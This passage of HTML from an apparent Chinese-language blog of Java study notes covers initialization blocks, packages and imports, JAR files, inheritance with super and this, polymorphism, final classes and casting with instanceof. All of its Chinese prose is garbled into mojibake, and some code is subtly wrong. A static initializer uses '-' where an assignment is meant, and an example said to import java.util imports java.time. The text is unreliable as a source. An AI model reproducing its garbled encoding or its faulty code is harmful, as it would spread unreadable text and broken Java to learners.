function">assignId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">assignId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> r <span class="token operator">=</span> nextId<span class="token punctuation">;</span>    nextId<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>è°ƒç”¨å¦ä¸€ä¸ªæ„é€ å™¨</strong></p><p>å…³é”®å­—<code>this</code>æŒ‡ç¤ºä¸€ä¸ªæ–¹æ³•çš„éšå¼å‚æ•°ã€‚æ­¤å¤–ï¼Œå¦‚æœæ„é€ å™¨çš„<strong>ç¬¬ä¸€ä¸ªè¯­å¥</strong>å½¢å¦‚<code>this(...)</code>ï¼Œè¿™ä¸ªæ„é€ å™¨å°†è°ƒç”¨åŒä¸€ä¸ªç±»çš„å¦ä¸€ä¸ªæ„é€ å™¨ã€‚</p><p><strong>åˆå§‹åŒ–å—(ä¸å¸¸è§)</strong></p><p>åœ¨ä¸€ä¸ªç±»çš„å£°æ˜ä¸­ï¼Œå¯ä»¥åŒ…å«ä»»æ„å¤šä¸ªä»£ç å—ã€‚åªè¦æ„é€ è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œè¿™äº›å—å°±ä¼šè¢«æ‰§è¡Œã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>    id <span class="token operator">=</span> nextId<span class="token punctuation">;</span>    nextId <span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>é¦–å…ˆ</strong>è¿è¡Œåˆå§‹åŒ–å—ï¼Œç„¶åæ‰è¿è¡Œæ„é€ å™¨çš„ä¸»ä½“éƒ¨åˆ†ã€‚é€šå¸¸ç›´æ¥æŠŠåˆå§‹åŒ–ä»£ç æ”¾åœ¨æ„é€ å™¨ä¸­ã€‚</p><p>å¦‚æœç±»çš„é™æ€å­—æ®µéœ€è¦å¾ˆå¤æ‚çš„åˆå§‹åŒ–ä»£ç ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨é™æ€çš„åˆå§‹åŒ–å—ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> generator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    nextId <span class="token operator">-</span> generator<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>ç”±äºJavaä¼šå®Œæˆè‡ªåŠ¨çš„åƒåœ¾å›æ”¶ï¼Œä¸éœ€è¦äººå·¥å›æ”¶å†…å­˜ï¼Œæ‰€ä»¥Javaä¸æ”¯æŒææ„å™¨ã€‚</strong></p><p><strong>åŒ…</strong></p><blockquote><p>Javaå…è®¸ä½¿ç”¨åŒ…å°†ç±»ç»„ç»‡åœ¨ä¸€ä¸ªé›†åˆä¸­ã€‚å€ŸåŠ©åŒ…å¯ä»¥æ–¹ä¾¿åœ°ç»„ç»‡è‡ªå·±çš„ä»£ç ï¼Œå¹¶å°†è‡ªå·±çš„ä»£ç ä¸åˆ«äººæä¾›çš„ä»£ç åº“åˆ†å¼€ç®¡ç†ã€‚</p></blockquote><p>ä½¿ç”¨åŒ…çš„ä¸»è¦åŸå› æ˜¯ç¡®ä¿ç±»åçš„å”¯ä¸€æ€§ã€‚ä¸ºäº†ä¿è¯åŒ…åçš„ç»å¯¹å”¯ä¸€æ€§ï¼Œè¦ç”¨ä¸€ä¸ªå› ç‰¹ç½‘åŸŸåä»¥é€†åºçš„å½¢å¼ä½œä¸ºåŒ…åï¼Œç„¶åå¯¹äºä¸åŒçš„å·¥ç¨‹ä½¿ç”¨ä¸åŒçš„å­åŒ…ã€‚</p><p><strong>ä¸€ä¸ªç±»å¯ä»¥ä½¿ç”¨æ‰€å±åŒ…ä¸­çš„æ‰€æœ‰ç±»ï¼Œä»¥åŠå…¶ä»–åŒ…ä¸­çš„å…¬å…±ç±»</strong></p><p>å¯ä»¥ä½¿ç”¨importè¯­å¥å¯¼å…¥ä¸€ä¸ªç‰¹å®šçš„ç±»æˆ–è€…æ•´ä¸ªåŒ…ã€‚importè¯­å¥åº”è¯¥ä½äºæºæ–‡ä»¶çš„é¡¶éƒ¨ï¼ˆä½†ä½äºpackageè¯­å¥çš„åé¢ï¼‰ã€‚</p><p>ä¾‹å¦‚å¯¼å…¥<code>java.util</code>åŒ…ä¸­çš„æ‰€æœ‰ç±»ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre><p>åªèƒ½ä½¿ç”¨æ˜Ÿå·å¯¼å…¥ä¸€ä¸ªåŒ…ï¼Œè€Œä¸èƒ½ä½¿ç”¨<code>import java.*</code>æˆ–è€…<code>import java.*.*</code>å¯¼å…¥æ‰€æœ‰ä»¥javaä¸ºå‰ç¼€çš„åŒ…ã€‚</p><p>æœ‰ä¸€ç§import è¯­å¥å…è®¸å¯¼å…¥é™æ€æ–¹æ³•å’Œé™æ€å­—æ®µï¼Œè€Œä¸åªæ˜¯ç±»ã€‚ä¾‹å¦‚ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre><p>å°±å¯ä»¥ä½¿ç”¨<code>System</code>ç±»çš„é™æ€æ–¹æ³•å’Œé™æ€å­—æ®µï¼Œè€Œä¸å¿…åŠ ç±»å‰ç¼€ã€‚</p><p>è¦æƒ³å°†ç±»æ”¾å…¥åŒ…ä¸­ï¼Œå°±å¿…é¡»å°†åŒ…çš„åå­—æ”¾åœ¨æºæ–‡ä»¶çš„å¼€å¤´ï¼Œå³æ”¾åœ¨å®šä¹‰è¿™ä¸ªåŒ…ä¸­å„ä¸ªç±»çš„ä»£ç ä¹‹å‰ã€‚</p><p>å¦‚æœæ²¡æœ‰åœ¨æºæ–‡ä»¶ä¸­æ”¾ç½®packageè¯­å¥ï¼Œè¿™ä¸ªæºæ–‡ä»¶ä¸­çš„ç±»å°±å±äºæ— ååŒ…ã€‚</p><p>å°†æºæ–‡ä»¶æ”¾åœ¨ä¸å®Œæ•´åŒ…ååŒ¹é…çš„å­ç›®å½•ä¸­ã€‚</p><p>Javaå’ŒPhpä¸åŒçš„æ˜¯ï¼ŒJavaå…¶å®ç®—æœ‰4ç§è®¿é—®ä¿®é¥°ç¬¦ã€‚å¦‚æœæ²¡æœ‰æŒ‡å®špublicæˆ–privateï¼Œè¿™ä¸ªéƒ¨åˆ†ï¼ˆç±»ã€æ–¹æ³•æˆ–å˜é‡ï¼‰å¯ä»¥è¢«åŒä¸€ä¸ªåŒ…ä¸­çš„æ‰€æœ‰æ–¹æ³•è®¿é—®ã€‚</p><blockquote><p>ç±»çš„æˆå‘˜ä¸å†™è®¿é—®ä¿®é¥°æ—¶é»˜è®¤ä¸ºdefaultã€‚é»˜è®¤å¯¹äºåŒä¸€ä¸ªåŒ…ä¸­çš„å…¶ä»–ç±»ç›¸å½“äºå…¬å¼€ï¼ˆpublicï¼‰ï¼Œå¯¹äºä¸æ˜¯åŒä¸€ä¸ªåŒ…ä¸­çš„å…¶ä»–ç±»ç›¸å½“äºç§æœ‰ï¼ˆprivateï¼‰</p></blockquote><p><img src="class.png" loading="lazy"></p><blockquote><p>Jaræ–‡ä»¶ä½¿ç”¨ZIPæ ¼å¼ç»„ç»‡æ–‡ä»¶å’Œå­ç›®å½•ã€‚å¯ä»¥ä½¿ç”¨ä»»ä½•ZIPå·¥å…·æŸ¥çœ‹JARæ–‡ä»¶ã€‚</p></blockquote><p>ä¸ºäº†ä½¿ç±»èƒ½å¤Ÿè¢«å¤šä¸ªç¨‹åºå…±äº«ï¼Œéœ€è¦åšåˆ°ä¸‹é¢å‡ ç‚¹ï¼š</p><ol><li>æŠŠç±»æ–‡ä»¶æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸­ã€‚éœ€è¦æ³¨æ„ï¼Œè¿™ç›®å½•æ˜¯åŒ…æ ‘çŠ¶ç»“æ„çš„åŸºç›®å½•ã€‚</li><li>å°†JARæ–‡ä»¶æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸­ã€‚</li><li>è®¾ç½®ç±»è·¯å¾„ã€‚ç±»è·¯å¾„æ˜¯æ‰€æœ‰åŒ…å«ç±»æ–‡ä»¶çš„è·¯å¾„çš„é›†åˆã€‚</li></ol><p>æœ€å¥½ä½¿ç”¨-classpathé€‰é¡¹æŒ‡å®šç±»è·¯å¾„ã€‚</p><p><strong>JARæ–‡ä»¶</strong></p><p>JARæ–‡ä»¶æ˜¯å‹ç¼©çš„ï¼Œå®ƒä½¿ç”¨äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„ZIPå‹ç¼©æ ¼å¼ã€‚</p><p>é€šè¿‡ä¸‹é¢çš„å‘½ä»¤å¯åŠ¨ç¨‹åºï¼š</p><pre class="language-java" data-language="java"><code class="language-java">java <span class="token operator">-</span>jar xxxxxx<span class="token punctuation">.</span>jar</code></pre><p><strong>ç±»è®¾è®¡æŠ€å·§</strong></p><ol><li>ä¸€å®šè¦ä¿è¯æ•°æ®ç§æœ‰ã€‚</li><li>ä¸€å®šè¦å¯¹æ•°æ®è¿›è¡Œåˆå§‹åŒ–ã€‚</li><li>ä¸è¦åœ¨ç±»ä¸­ä½¿ç”¨è¿‡å¤šçš„åŸºæœ¬ç±»å‹ã€‚</li><li>ä¸æ˜¯æ‰€æœ‰çš„å­—æ®µéƒ½éœ€è¦å•ç‹¬çš„å­—æ®µè®¿é—®å™¨å’Œå­—æ®µæ›´æ”¹å™¨ã€‚</li><li>åˆ†è§£æœ‰è¿‡å¤šèŒè´£çš„ç±»ã€‚</li><li>ç±»åå’Œæ–¹æ³•åè¦èƒ½å¤Ÿä½“ç°å®ƒä»¬çš„èŒè´£ã€‚</li><li>ä¼˜å…ˆä½¿ç”¨ä¸å¯å˜çš„ç±»ã€‚</li></ol><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p><strong>ç»§æ‰¿</strong>çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå¯ä»¥åŸºäºå·²æœ‰çš„ç±»åˆ›å»ºæ–°çš„ç±»ã€‚ç»§æ‰¿å·²å­˜åœ¨çš„ç±»å°±æ˜¯å¤ç”¨ï¼ˆç»§æ‰¿ï¼‰è¿™äº›ç±»çš„æ–¹æ³•ï¼Œè€Œä¸”å¯ä»¥å¢åŠ ä¸€äº›æ–°çš„æ–¹æ³•å’Œå­—æ®µï¼Œä½¿æ–°ç±»èƒ½å¤Ÿé€‚åº”æ–°çš„æƒ…å†µã€‚</p><h4 id="ç±»ã€è¶…ç±»å’Œå­ç±»"><a href="#ç±»ã€è¶…ç±»å’Œå­ç±»" class="headerlink" title="ç±»ã€è¶…ç±»å’Œå­ç±»"></a>ç±»ã€è¶…ç±»å’Œå­ç±»</h4><p>ä½¿ç”¨extendsè¡¨ç¤ºç»§æ‰¿ã€‚</p><p>é€šè¿‡æ‹“å±•è¶…ç±»å®šä¹‰å­ç±»çš„æ—¶å€™ï¼Œåªéœ€è¦æŒ‡å‡ºå­ç±»ä¸è¶…ç±»çš„ä¸åŒä¹‹å¤„ã€‚</p><p>åªæœ‰çˆ¶ç±»çš„æ–¹æ³•èƒ½è®¿é—®çˆ¶ç±»çš„ç§æœ‰å­—æ®µï¼Œè¿™æ„å‘³å¦‚æœå­ç±»çš„æ–¹æ³•ä¸èƒ½ç›´æ¥è®¿é—®çˆ¶ç±»çš„ç§æœ‰å­—æ®µï¼Œéœ€è¦ä½¿ç”¨å…¬å…±æ¥å£ï¼Œç±»ä¼¼<code>getSalary()</code>è¿™æ ·çš„ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bonus<span class="token operator">+</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>super.getSalary()</code>ï¼Œå› ä¸ºæˆ‘ä»¬å¸Œæœ›è°ƒç”¨çš„æ˜¯è¶…ç±»çš„<code>getSalary</code>æ–¹æ³•ï¼Œè€Œä¸æ˜¯å½“å‰ç±»çš„è¿™ä¸ªæ–¹æ³•ã€‚</p><p>ç»§æ‰¿ç»å¯¹ä¸ä¼šåˆ é™¤ä»»ä½•å­—æ®µæˆ–æ–¹æ³•ã€‚</p><p>å­ç±»çš„æ„é€ å™¨ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>    bonus <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>super(name,salary);</code>æ˜¯è°ƒç”¨è¶…ç±»<code>Employee</code>ä¸­çš„è¿™ä¸ªæ„é€ å™¨ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>ä½¿ç”¨superè°ƒç”¨æ„é€ å™¨çš„è¯­å¥å¿…é¡»æ˜¯å­ç±»æ„é€ å™¨çš„ç¬¬ä¸€æ¡è¯­å¥ã€‚</strong></p><p>å¦‚æœå­ç±»çš„æ„é€ å™¨æ²¡æœ‰æ˜¾å¼åœ°è°ƒç”¨è¶…ç±»çš„æ„é€ å™¨ï¼Œè®²è‡ªåŠ¨è°ƒç”¨è¶…ç±»çš„æ— å‚æ•°æ„é€ å™¨ã€‚å¦‚æœè¶…ç±»æ²¡æœ‰æ— å‚æ•°çš„æ„é€ å™¨ï¼Œå¹¶ä¸”åœ¨å­ç±»çš„æ„é€ å™¨ä¸­åˆæ²¡æœ‰æ˜¾å¼åœ°è°ƒç”¨è¶…ç±»çš„å…¶ä»–æ„é€ å™¨ï¼ŒJavaç¼–è¯‘å™¨å°±ä¼šæŠ¥å‘Šä¸€ä¸ªé”™è¯¯ã€‚</p><p>thisï¼š</p><ul><li>æŒ‡ç¤ºéšå¼å‚æ•°çš„å¼•ç”¨ã€‚</li><li>è°ƒç”¨è¯¥ç±»çš„å…¶ä»–æ„é€ å™¨ã€‚</li></ul><p>superï¼š</p><ul><li>è°ƒç”¨è¶…ç±»çš„æ–¹æ³•ã€‚</li><li>è°ƒç”¨è¶…ç±»çš„æ„é€ å™¨ã€‚</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name">Manager</span> boss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    boss<span class="token punctuation">.</span><span class="token function">setBonus</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> boss<span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng2"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    staff<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng3"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> e<span class="token operator">:</span>staff<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>å°½ç®¡å°†eå£°æ˜ä¸ºEmployeeç±»å‹ï¼Œä½†å®é™…ä¸Šeæ—¢å¯ä»¥å¼•ç”¨Employeeç±»å‹çš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥å¼•ç”¨Managerç±»å‹çš„å¯¹è±¡ã€‚</p><p>è™šæ‹ŸæœºçŸ¥é“eå®é™…å¼•ç”¨çš„å¯¹è±¡ç±»å‹ï¼Œå› æ­¤èƒ½å¤Ÿæ­£ç¡®åœ°è°ƒç”¨ç›¸åº”çš„æ–¹æ³•ã€‚</p><p>ä¸€ä¸ªå¯¹è±¡å˜é‡å¯ä»¥æŒ‡ç¤ºå¤šç§å®é™…ç±»å‹çš„ç°è±¡ç§°ä¸º<strong>å¤šæ€</strong>ã€‚åœ¨è¿è¡Œæ—¶èƒ½å¤Ÿè‡ªåŠ¨åœ°é€‰æ‹©é€‚å½“çš„æ–¹æ³•ï¼Œç§°ä¸º<strong>åŠ¨æ€ç»‘å®š</strong>ã€‚</p><h4 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h4><p>is-aè§„åˆ™ï¼Œå®ƒæŒ‡å‡ºå­ç±»çš„æ¯ä¸ªå¯¹è±¡ä¹Ÿæ˜¯è¶…ç±»çš„å¯¹è±¡ã€‚</p><p><strong>is-aè§„åˆ™çš„å¦ä¸€ç§è¡¨è¿°æ˜¯æ›¿æ¢åŸåˆ™ã€‚å®ƒæŒ‡å‡ºç¨‹åºä¸­å‡ºç°è¶…ç±»å¯¹è±¡çš„ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å­ç±»å¯¹è±¡æ›¿æ¢ã€‚</strong></p><p>åœ¨Javaç¨‹åºè®¾è®¡è¯­è¨€ä¸­ï¼Œå¯¹è±¡å˜é‡æ˜¯å¤šæ€çš„ã€‚ä¸€ä¸ªEmployeeç±»å‹çš„å˜é‡æ—¢å¯ä»¥å¼•ç”¨ä¸€ä¸ªEmployeeç±»å‹çš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥å¼•ç”¨Employeeç±»çš„ä»»ä½•ä¸€ä¸ªå­ç±»çš„å¯¹è±¡ã€‚</p><p>ä¸èƒ½å°†è¶…ç±»çš„å¼•ç”¨èµ‹ç»™å­ç±»å˜é‡ã€‚</p><blockquote><p>åœ¨Javaä¸­ï¼Œå­ç±»å¼•ç”¨çš„æ•°ç»„å¯ä»¥è½¬æ¢æˆè¶…ç±»å¼•ç”¨çš„æ•°ç»„ï¼Œè€Œä¸éœ€è¦ä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</p></blockquote><p>åœ¨è¦†ç›–ä¸€ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œå­ç±»æ–¹æ³•ä¸èƒ½ä½äºè¶…ç±»æ–¹æ³•çš„å¯è§æ€§ã€‚ç‰¹åˆ«æ˜¯ï¼Œå¦‚æœè¶…ç±»æ–¹æ³•æ˜¯publicï¼Œå­ç±»æ–¹æ³•å¿…é¡»ä¹Ÿè¦å£°æ˜ä¸ºpublicã€‚</p><h4 id="é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•"><a href="#é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•" class="headerlink" title="é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•"></a>é˜»æ­¢ç»§æ‰¿ï¼šfinalç±»å’Œæ–¹æ³•</h4><p>ä¸å…è®¸æ‹“å±•çš„ç±»è¢«ç§°ä¸ºfinalç±»ã€‚åœ¨å®šä¹‰ç±»çš„æ—¶å€™ä½¿ç”¨finalä¿®é¥°ç¬¦å°±è¡¨æ˜è¿™ä¸ªç±»æ˜¯finalç±»ã€‚</p><p>ç±»ä¸­çš„æŸä¸ªç‰¹å®šæ–¹æ³•ä¹Ÿå¯ä»¥è¢«å£°æ˜ä¸ºfinalã€‚å¦‚æœè¿™æ ·åšï¼Œå­ç±»å°±ä¸èƒ½è¦†ç›–è¿™ä¸ªæ–¹æ³•ï¼ˆfinalç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•è‡ªåŠ¨åœ°æˆä¸ºfinalæ–¹æ³•ï¼Œä½†æ˜¯ä¸åŒ…æ‹¬å­—æ®µï¼Œä¹Ÿå°±æ˜¯è¯´å­—æ®µä¸ä¼šè‡ªåŠ¨æˆä¸ºfinalï¼‰ã€‚</p><h4 id="å¼ºåˆ¶ç±»å‹è½¬æ¢"><a href="#å¼ºåˆ¶ç±»å‹è½¬æ¢" class="headerlink" title="å¼ºåˆ¶ç±»å‹è½¬æ¢"></a>å¼ºåˆ¶ç±»å‹è½¬æ¢</h4><p><strong>å°†ä¸€ä¸ªå€¼å­˜å…¥å˜é‡æ—¶ï¼Œç¼–è¯‘å™¨å°†æ£€æŸ¥ä½ æ˜¯å¦æ‰¿è¯ºè¿‡å¤šã€‚å¦‚æœå°†ä¸€ä¸ªå­ç±»çš„å¼•ç”¨èµ‹å€¼ç»™ä¸€ä¸ªè¶…ç±»å˜é‡ï¼Œç¼–è¯‘å™¨æ˜¯å…è®¸çš„ã€‚ä½†å°†ä¸€ä¸ªè¶…ç±»çš„å¼•ç”¨èµ‹ç»™ä¸€ä¸ªå­ç±»å˜é‡æ—¶ï¼Œå°±æ‰¿è¯ºè¿‡å¤šäº†ã€‚å¿…é¡»è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿé€šè¿‡è¿è¡Œæ—¶çš„æ£€æŸ¥ã€‚</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manager</span> test1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test3 <span class="token operator">=</span> test1<span class="token punctuation">;</span>  <span class="token comment">//å¯ä»¥</span><span class="token class-name">Manager</span> test4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> test2<span class="token punctuation">;</span>  <span class="token comment">//å¿…é¡»å¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚è€Œä¸”è¿™æ ·æ˜¯æœ‰é—®é¢˜çš„ã€‚</span></code></pre><blockquote><p>æˆ‘ä¸ªäººçš„ç†è§£å°±æ˜¯ï¼Œå­ç±»å¯ä»¥ç›´æ¥éšå¼è½¬æ¢æˆçˆ¶ç±»ï¼Œä½†æ˜¯çˆ¶ç±»éœ€è¦å¼ºåˆ¶ç±»å‹è½¬æ¢æˆå­ç±»ã€‚</p></blockquote><p>åœ¨è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ä¹‹å‰ï¼Œå…ˆæŸ¥çœ‹æ˜¯å¦èƒ½å¤ŸæˆåŠŸåœ°è½¬æ¢ã€‚ä¸ºæ­¤åªéœ€è¦ä½¿ç”¨instanceofæ“ä½œç¬¦å°±å¯ä»¥å®ç°ã€‚</p><p><code>instanceof</code>æ˜¯Javaä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œå·¦è¾¹æ˜¯å¯¹è±¡ï¼Œå³è¾¹æ˜¯ç±»ï¼›å½“å¯¹è±¡æ˜¯å³è¾¹ç±»æˆ–å­ç±»æ‰€åˆ›å»ºå¯¹è±¡æ—¶ï¼Œè¿”å›trueï¼›å¦åˆ™ï¼Œè¿”å›falseã€‚</p><ul><li><code>instanceof</code>æ˜¯Javaä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ï¼Œå·¦è¾¹æ˜¯å¯¹è±¡ï¼Œå³è¾¹æ˜¯ç±»ï¼›å½“å¯¹è±¡æ˜¯å³è¾¹ç±»æˆ–å­ç±»æ‰€åˆ›å»ºå¯¹è±¡æ—¶ï¼Œè¿”å›trueï¼›å¦åˆ™ï¼Œè¿”å›falseã€‚</li><li><code>instanceof</code>å·¦è¾¹æ˜¾å¼å£°æ˜çš„ç±»å‹ä¸å³è¾¹æ“ä½œå…ƒå¿…é¡»æ˜¯åŒç§ç±»æˆ–å­˜åœ¨ç»§æ‰¿å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦ä½äºåŒä¸€ä¸ªç»§æ‰¿æ ‘ï¼Œå¦åˆ™ä¼šç¼–è¯‘é”™è¯¯ã€‚</li></ul><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Manager</span> test1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"test2"</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Employee</span> test3 <span class="token operator">=</span> test1<span class="token punctuation">;</span><span class="token comment">//Manager test4 = (Manager) test2;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>test2 <span class="token keyword">instanceof</span> <span class="token class-name">Manager</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Manager</span> test4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Manager</span><span class="token punctuation">)</span> test2<span class="token punctuation">;</span><span class="token 